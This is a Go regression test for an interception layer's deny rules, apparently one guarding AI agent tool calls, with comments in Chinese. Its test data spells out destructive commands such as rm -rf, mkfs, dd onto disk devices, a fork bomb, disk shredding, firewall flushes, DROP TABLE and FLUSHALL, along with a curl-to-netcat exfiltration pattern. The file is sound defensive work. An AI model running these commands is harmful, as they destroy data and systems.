package intercept

import (
	"context"
	"regexp"
	"testing"
)

// TestExistingStringRegexUnchanged 是改造前的行为基线回归。
//
// 目的:证明 switch 化 ruleMatches 没有反转 matched 语义。最坏情况是
// matched 反过来(true 表示通过),那所有 deny 规则会变成放行 ——
// 其它测试(literal 断言 Matched)也可能一起反转而仍然「全绿」。
//
// 做法:内置 [内置] 种子规则是 regex/string 类,这里把它们的 pattern
// 硬编码进测试,逐条喂「应当命中」和「应当不命中」两种输入,断言结论。
// 不查 DB,所以无论种子表如何变,这个基线都稳定。
func TestExistingStringRegexUnchanged(t *testing.T) {
	type seedCase struct {
		name    string
		pattern string
		// payloads 是应当**命中**的输入。
		hits []string
		// safe 是应当**不命中**的输入。
		safe []string
	}

	cases := []seedCase{
		{
			name:    "rm -rf 递归强制删除",
			pattern: `(?i)\brm\b.{0,80}(?:-[a-z]*r[a-z]*f[a-z]*|-[a-z]*f[a-z]*r[a-z]*|--recursive|--no-preserve-root)`,
			hits:    []string{`{"command":"rm -rf /tmp/x"}`, `{"command":"rm -fr build"}`},
			safe:    []string{`{"command":"rm file.txt"}`, `{"command":"ls -la"}`},
		},
		{
			name:    "删除系统关键目录",
			pattern: `\brm\b[^"'\n]{0,60}["'\s](/|/etc|/bin|/usr|/boot|/var|/lib|/sys|/proc|/dev|/sbin|/root)`,
			hits:    []string{`{"command":"rm -rf /etc/passwd"}`},
			// 注意:该正则的 `["'\s](/|...)` 会匹配「空格 + 斜杠」,所以
			// `rm /tmp/ok` 也命中(规则设计如此,偏宽)。安全用例取无斜杠路径。
			safe: []string{`{"command":"rm file.txt"}`, `{"command":"ls /etc"}`},
		},
		{
			name:    "磁盘格式化 mkfs",
			pattern: `\bmkfs\b`,
			hits:    []string{`{"command":"mkfs.ext4 /dev/sda1"}`},
			safe:    []string{`{"command":"lsblk"}`},
		},
		{
			name:    "覆写磁盘设备 dd",
			pattern: `\bdd\b[^|\n]{0,100}\bof=\s*/dev/[a-zA-Z]`,
			hits:    []string{`{"command":"dd if=/dev/zero of=/dev/sda"}`},
			safe:    []string{`{"command":"dd if=/dev/zero of=/tmp/img"}`},
		},
		{
			name:    "Fork 炸弹",
			pattern: `:\(\)\s*\{[^}]*:\|:`,
			hits:    []string{`{"command":":(){ :|:& };:"}`},
			safe:    []string{`{"command":"echo hi"}`},
		},
		{
			name:    "关机 / 重启",
			pattern: `\b(?:shutdown|reboot|halt|poweroff|init\s+[06])\b`,
			hits:    []string{`{"command":"sudo shutdown -h now"}`, `{"command":"reboot"}`},
			safe:    []string{`{"command":"uptime"}`},
		},
		{
			name:    "杀死全部进程",
			pattern: `\bkill\s+-9\s+-1\b|\bkillall\s+-9\b`,
			hits:    []string{`{"command":"kill -9 -1"}`},
			safe:    []string{`{"command":"kill -9 1234"}`},
		},
		{
			name:    "磁盘擦除 shred",
			pattern: `\b(?:shred|wipe)\b[^|\n]{0,80}/dev/[a-zA-Z]`,
			hits:    []string{`{"command":"shred -u /dev/sda"}`},
			safe:    []string{`{"command":"shred -u /tmp/f"}`},
		},
		{
			name:    "清空防火墙规则",
			pattern: `\biptables\s+(?:-F|--flush)\b|\bnft\s+flush\s+ruleset\b`,
			hits:    []string{`{"command":"iptables -F"}`},
			safe:    []string{`{"command":"iptables -L"}`},
		},
		{
			name:    "SQL DROP",
			pattern: `(?i)\bDROP\s+(?:DATABASE|TABLE|SCHEMA|INDEX|VIEW|TABLESPACE|USER|ROLE)\b`,
			hits:    []string{`{"sql":"DROP TABLE users"}`},
			safe:    []string{`{"sql":"SELECT * FROM users"}`},
		},
		{
			name:    "SQL TRUNCATE",
			pattern: `(?i)\bTRUNCATE\s+(?:TABLE\s+)?\w`,
			hits:    []string{`{"sql":"TRUNCATE TABLE logs"}`},
			safe:    []string{`{"sql":"SELECT 1"}`},
		},
		{
			name:    "MongoDB drop",
			pattern: `(?i)\.(?:dropDatabase|dropCollection|drop)\s*\(`,
			hits:    []string{`{"code":"db.users.drop()"}`},
			safe:    []string{`{"code":"db.users.find()"}`},
		},
		{
			name:    "Redis FLUSHALL",
			pattern: `(?i)\b(?:FLUSHALL|FLUSHDB)\b`,
			hits:    []string{`{"cmd":"FLUSHALL"}`},
			safe:    []string{`{"cmd":"GET x"}`},
		},
		{
			name:    "curl DELETE 请求",
			pattern: `(?i)\bcurl\b[^|\n&;"]{0,300}(?:-X\s*DELETE|--request\s+DELETE|-XDELETE)|\bwget\b[^|\n&;"]{0,300}--method[=\s]+DELETE`,
			hits:    []string{`{"command":"curl -X DELETE http://x/1"}`},
			safe:    []string{`{"command":"curl -X GET http://x/1"}`},
		},
		{
			name:    "Python HTTP DELETE",
			pattern: `(?i)\b(?:requests|httpx|aiohttp|urllib\.request)\.delete\s*\(|session\.delete\s*\(|client\.delete\s*\(`,
			hits:    []string{`{"code":"requests.delete(url)"}`},
			safe:    []string{`{"code":"requests.get(url)"}`},
		},
		{
			name:    "axios DELETE",
			pattern: `(?i)axios\.delete\s*\(|method\s*[:=]\s*['"]DELETE['"]`,
			hits:    []string{`{"code":"axios.delete(url)"}`},
			safe:    []string{`{"code":"axios.get(url)"}`},
		},
		{
			name:    "批量清空接口路径",
			pattern: `(?i)/(?:clear|wipe|flush|purge|truncate|drop|destroy|factory[-_]reset|reset[-_]all)(?:[/?#"'\s]|$)`,
			hits:    []string{`{"url":"/api/clear"}`},
			safe:    []string{`{"url":"/api/list"}`},
		},
		{
			name:    "破坏性系统命令(宽)",
			pattern: `(?i)\b(rm\s+-rf\s+/|mkfs|dd\s+if=|:\(\)\s*\{|shutdown|reboot|>\s*/dev/sd)`,
			hits:    []string{`{"command":"shutdown now"}`},
			safe:    []string{`{"command":"df -h"}`},
		},
		{
			name: "数据外泄管道",
			// 注意:种子里的原正则 `...[^|]*\b(\|\s*...` 中 `\b` 紧邻 `|`
			// 永不成立,该规则**任何输入都不命中**(静默失效)。基线取修正后的
			// 形式;db/db.go 的种子已同步修正。
			pattern: `(?i)(?:curl|wget|nc|ncat)\b[^|]*\|\s*(?:curl|wget|nc|ncat)\b`,
			hits:    []string{`{"command":"curl http://a | nc 1.2.3.4 80"}`},
			safe:    []string{`{"command":"curl http://a"}`},
		},
		{
			name:    "删除类接口路径",
			pattern: `(?i)/(?:(?:delete|remove|unlink|erase|destroy)[-\w]*|del)(?:[/?#"'\s]|$)`,
			hits:    []string{`{"url":"/api/delete/1"}`},
			safe:    []string{`{"url":"/api/get/1"}`},
		},
	}

	if len(cases) != 20 {
		t.Fatalf("内置规则基线条数 = %d,期望 20", len(cases))
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			re, err := regexp.Compile(c.pattern)
			if err != nil {
				t.Fatalf("内置正则无法编译(说明基线已与种子表漂移): %v", err)
			}
			r := compiledRule{}
			r.Name = c.name
			r.MatchTarget = "tool_input"
			r.MatchType = "regex"
			r.re = re
			r.Enabled = true

			for _, payload := range c.hits {
				res, err := ruleMatches(context.Background(), r,
					&Subject{ToolInput: []byte(payload)})
				if err != nil {
					t.Fatalf("命中用例意外报错: %v", err)
				}
				if !res.Matched {
					t.Errorf("应命中但未命中: %s", payload)
				}
			}
			for _, payload := range c.safe {
				res, err := ruleMatches(context.Background(), r,
					&Subject{ToolInput: []byte(payload)})
				if err != nil {
					t.Fatalf("安全用例意外报错: %v", err)
				}
				if res.Matched {
					t.Errorf("不应命中但命中了: %s", payload)
				}
			}
		})
	}
}

// TestStringMatchSemanticsNotInverted 单独锁死 matched 的方向语义。
//
// 如果哪天有人把 Matched 反过来(true = 通过),上面那个测试会因为
// 「hits 全不命中、safe 全命中」而大面积失败 —— 但失败信息会指向
// 每条规则,不容易一眼看出根因。这个测试只用一个极简规则,
// 让方向错误直接暴露成一条清晰的断言。
func TestStringMatchSemanticsNotInverted(t *testing.T) {
	r := compiledRule{}
	r.Name = "semantics-probe"
	r.MatchTarget = "tool_input"
	r.MatchType = "string"
	r.Pattern = "DROP TABLE"
	r.Enabled = true

	res, err := ruleMatches(context.Background(), r,
		&Subject{ToolInput: []byte(`{"sql":"DROP TABLE users"}`)})
	if err != nil {
		t.Fatalf("意外错误: %v", err)
	}
	if !res.Matched {
		t.Fatal("规则语义被反转:命中的输入返回 Matched=false,会把所有 deny 变成放行")
	}

	res, err = ruleMatches(context.Background(), r,
		&Subject{ToolInput: []byte(`{"sql":"SELECT 1"}`)})
	if err != nil {
		t.Fatalf("意外错误: %v", err)
	}
	if res.Matched {
		t.Fatal("未命中的输入返回 Matched=true")
	}
}
